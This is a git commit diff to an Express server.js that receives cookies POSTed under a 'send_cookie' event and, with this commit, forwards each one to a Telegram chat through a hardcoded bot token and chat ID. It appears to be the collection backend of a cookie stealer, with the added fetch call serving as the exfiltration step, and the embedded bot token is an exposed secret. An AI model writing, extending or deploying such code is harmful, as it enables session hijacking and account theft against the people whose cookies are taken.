66eea7954ab44f385ac0c9a253378a9dc919c901
GitamDeveloper <143604314+GitamDeveloper@users.noreply.github.com>
2026-03-11 13:06:56 +0300

    Integrate Telegram bot for sending cookie data
    Added Telegram bot integration to send cookies.

--- server.js
+++ server.js
@@ -1,17 +1,35 @@
-
 const express = require('express');
 const app = express();
 
 const PORT = process.env.PORT || 3000;
 
+const BOT_TOKEN = "8556504851:AAHlfQ9GCNGj8WXNGhkH29eU2v8HYGWK8EU";
+const CHAT_ID = "2145141785";
+
 app.use(express.json());
 
-app.post('/data', (req, res) => {
+app.post('/data', async (req, res) => {
 
-    if (req.body.event == "send_cookie") {
-        console.log(req.body.cookie);
-        res.json({status: ok})
+    if (req.body.event === "send_cookie") {
+
+        const cookie = req.body.cookie;
+
+        console.log(cookie);
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: cookie
+            })
+        });
+
+        res.json({ status: "ok" });
     }
+
 });
 
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
